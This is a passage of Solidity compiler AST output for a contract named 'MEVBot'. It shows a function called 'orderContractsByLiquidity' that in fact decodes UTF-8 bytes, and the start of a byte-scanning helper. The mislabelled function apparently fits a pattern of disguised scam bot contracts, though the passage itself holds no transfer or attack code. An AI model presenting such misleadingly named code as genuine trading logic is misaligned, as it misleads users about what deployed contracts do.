															"nodeType": "ExpressionStatement",
															"src": "6501:7:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 530,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 528,
																	"name": "length",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 506,
																	"src": "6522:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "31",
																	"id": 529,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "6531:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"src": "6522:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 531,
															"nodeType": "ExpressionStatement",
															"src": "6522:10:0"
														}
													]
												}
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 578,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 575,
														"name": "length",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 506,
														"src": "6832:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 576,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 489,
															"src": "6841:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																"typeString": "struct MEVBot.slice memory"
															}
														},
														"id": 577,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 37,
														"src": "6841:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "6832:18:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 582,
												"nodeType": "IfStatement",
												"src": "6828:57:0",
												"trueBody": {
													"id": 581,
													"nodeType": "Block",
													"src": "6852:33:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 579,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6873:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"functionReturnParameters": 493,
															"id": 580,
															"nodeType": "Return",
															"src": "6866:8:0"
														}
													]
												}
											},
											{
												"body": {
													"id": 629,
													"nodeType": "Block",
													"src": "6929:250:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 597,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 593,
																	"name": "divisor",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 509,
																	"src": "6943:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 596,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 594,
																		"name": "divisor",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 509,
																		"src": "6953:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "/",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "323536",
																		"id": 595,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "6963:3:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_256_by_1",
																			"typeString": "int_const 256"
																		},
																		"value": "256"
																	},
																	"src": "6953:13:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "6943:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 598,
															"nodeType": "ExpressionStatement",
															"src": "6943:23:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 606,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 599,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 516,
																	"src": "6980:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 605,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 602,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 600,
																					"name": "word",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 503,
																					"src": "6985:4:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "/",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 601,
																					"name": "divisor",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 509,
																					"src": "6992:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "6985:14:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"id": 603,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "6984:16:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "30784646",
																		"id": 604,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7003:4:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_255_by_1",
																			"typeString": "int_const 255"
																		},
																		"value": "0xFF"
																	},
																	"src": "6984:23:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "6980:27:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 607,
															"nodeType": "ExpressionStatement",
															"src": "6980:27:0"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 612,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 610,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 608,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 516,
																		"src": "7025:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "30784330",
																		"id": 609,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7029:4:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_192_by_1",
																			"typeString": "int_const 192"
																		},
																		"value": "0xC0"
																	},
																	"src": "7025:8:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "!=",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30783830",
																	"id": 611,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "7037:4:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_128_by_1",
																		"typeString": "int_const 128"
																	},
																	"value": "0x80"
																},
																"src": "7025:16:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 616,
															"nodeType": "IfStatement",
															"src": "7021:105:0",
															"trueBody": {
																"id": 615,
																"nodeType": "Block",
																"src": "7043:83:0",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"hexValue": "30",
																			"id": 613,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "7110:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_0_by_1",
																				"typeString": "int_const 0"
																			},
																			"value": "0"
																		},
																		"functionReturnParameters": 493,
																		"id": 614,
																		"nodeType": "Return",
																		"src": "7103:8:0"
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 627,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 617,
																	"name": "ret",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 492,
																	"src": "7139:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 626,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 620,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 618,
																					"name": "ret",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 492,
																					"src": "7146:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "*",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3634",
																					"id": 619,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "7152:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_64_by_1",
																						"typeString": "int_const 64"
																					},
																					"value": "64"
																				},
																				"src": "7146:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"id": 621,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "7145:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "|",
																	"rightExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 624,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 622,
																					"name": "b",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 516,
																					"src": "7159:1:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "&",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "30783346",
																					"id": 623,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "7163:4:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_63_by_1",
																						"typeString": "int_const 63"
																					},
																					"value": "0x3F"
																				},
																				"src": "7159:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"id": 625,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "7158:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "7145:23:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "7139:29:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 628,
															"nodeType": "ExpressionStatement",
															"src": "7139:29:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 589,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 587,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 584,
														"src": "6912:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 588,
														"name": "length",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 506,
														"src": "6916:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "6912:10:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 630,
												"initializationExpression": {
													"assignments": [
														584
													],
													"declarations": [
														{
															"constant": false,
															"id": 584,
															"mutability": "mutable",
															"name": "i",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 630,
															"src": "6900:6:0",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 583,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "6900:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 586,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 585,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6909:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "6900:10:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 591,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "6924:3:0",
														"subExpression": {
															"argumentTypes": null,
															"id": 590,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 584,
															"src": "6924:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 592,
													"nodeType": "ExpressionStatement",
													"src": "6924:3:0"
												},
												"nodeType": "ForStatement",
												"src": "6895:284:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 631,
													"name": "ret",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 492,
													"src": "7196:3:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 493,
												"id": 632,
												"nodeType": "Return",
												"src": "7189:10:0"
											}
										]
									},
									"documentation": null,
									"id": 634,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "orderContractsByLiquidity",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 490,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 489,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 634,
												"src": "6141:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
													"typeString": "struct MEVBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 488,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 40,
													"src": "6141:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$40_storage_ptr",
														"typeString": "struct MEVBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6140:19:0"
									},
									"returnParameters": {
										"id": 493,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 492,
												"mutability": "mutable",
												"name": "ret",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 634,
												"src": "6183:8:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 491,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "6183:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6182:10:0"
									},
									"scope": 1583,
									"src": "6106:1100:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 721,
										"nodeType": "Block",
										"src": "7458:554:0",
										"statements": [
											{
												"assignments": [
													642
												],
												"declarations": [
													{
														"constant": false,
														"id": 642,
														"mutability": "mutable",
														"name": "ptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 721,
														"src": "7468:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 641,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7468:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 647,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 646,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 643,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 636,
															"src": "7479:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																"typeString": "struct MEVBot.slice memory"
															}
														},
														"id": 644,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 39,
														"src": "7479:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "3331",
														"id": 645,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "7491:2:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_31_by_1",
															"typeString": "int_const 31"
														},
														"value": "31"
													},
													"src": "7479:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7468:25:0"
											},
											{
												"assignments": [
													649
												],
												"declarations": [
													{
														"constant": false,
														"id": 649,
														"mutability": "mutable",
														"name": "end",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 721,
														"src": "7503:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 648,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7503:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 654,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 653,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 650,
														"name": "ptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 642,
														"src": "7514:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 651,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 636,
															"src": "7520:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																"typeString": "struct MEVBot.slice memory"
															}
														},
														"id": 652,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 37,
														"src": "7520:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7514:15:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7503:26:0"
											},
											{
												"body": {
													"id": 719,
													"nodeType": "Block",
													"src": "7567:439:0",
													"statements": [
														{
															"assignments": [
																666
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 666,
																	"mutability": "mutable",
																	"name": "b",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 719,
																	"src": "7581:7:0",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint8",
																		"typeString": "uint8"
																	},
																	"typeName": {
																		"id": 665,
																		"name": "uint8",
																		"nodeType": "ElementaryTypeName",
																		"src": "7581:5:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 667,
															"initialValue": null,
															"nodeType": "VariableDeclarationStatement",
															"src": "7581:7:0"
														},
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "7611:30:0",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "7613:26:0",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "ptr",
																							"nodeType": "YulIdentifier",
																							"src": "7628:3:0"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "7622:5:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "7622:10:0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "7634:4:0",
																					"type": "",
																					"value": "0xFF"
																				}
																			],
																			"functionName": {
																				"name": "and",
																				"nodeType": "YulIdentifier",
																				"src": "7618:3:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "7618:21:0"
																		},
																		"variableNames": [
																			{
																				"name": "b",
																				"nodeType": "YulIdentifier",
																				"src": "7613:1:0"
																			}
																		]
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 666,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "7613:1:0",
																	"valueSize": 1
																},
																{
																	"declaration": 642,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "7628:3:0",
																	"valueSize": 1
																}
															],
															"id": 668,
															"nodeType": "InlineAssembly",
															"src": "7602:39:0"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint8",
																	"typeString": "uint8"
																},
																"id": 671,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 669,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 666,
																	"src": "7658:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint8",
																		"typeString": "uint8"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30783830",
																	"id": 670,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "7662:4:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_128_by_1",
																		"typeString": "int_const 128"
																	},
																	"value": "0x80"
																},
																"src": "7658:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint8",
																		"typeString": "uint8"
																	},
																	"id": 679,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 677,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 666,
																		"src": "7718:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "<",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "30784530",
																		"id": 678,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7722:4:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_224_by_1",
																			"typeString": "int_const 224"
																		},
																		"value": "0xE0"
																	},
																	"src": "7718:8:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		},
																		"id": 687,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 685,
																			"name": "b",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 666,
																			"src": "7778:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "<",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "30784630",
																			"id": 686,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
